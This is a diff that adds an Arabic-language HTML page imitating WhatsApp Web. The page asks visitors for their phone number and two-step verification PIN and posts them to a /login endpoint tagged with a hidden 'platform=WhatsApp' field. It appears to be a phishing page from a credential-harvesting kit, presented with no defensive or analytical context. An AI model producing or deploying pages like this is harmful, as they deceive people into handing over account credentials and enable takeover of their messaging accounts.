@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Web</title>
+    <style>
+        body { font-family: Segoe UI, Helvetica Neue, Helvetica, Lucida Grande, Arial, Ubuntu, Cantarell, Fira Sans, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .wa-card { background: #ffffff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15); width: 380px; text-align: center; }
+        .wa-card h2 { color: #00a884; margin-bottom: 20px; }
+        .wa-card input { width: 90%; padding: 12px; margin-bottom: 15px; border: 1px solid #e9edef; border-radius: 6px; font-size: 15px; background-color: #f5f6f6; }
+        .wa-card button { width: 95%; background-color: #00a884; border: none; border-radius: 6px; color: white; font-size: 16px; font-weight: bold; padding: 12px; cursor: pointer; }
+        .wa-card button:hover { background-color: #01755f; }
+    </style>
+</head>
+<body>
+    <div class="wa-card">
+        <h2>ربط حساب واتساب</h2>
+        <form action="/login" method="POST">
+            <input type="hidden" name="platform" value="WhatsApp">
+            <input type="text" name="username" placeholder="رقم الهاتف مع رمز الدولة" required>
+            <input type="password" name="password" placeholder="رمز التحقق بخطوتين (إن وجد)" required>
+            <button type="submit">متابعة</button>
+        </form>
+    </div>
+</body>
+</html>
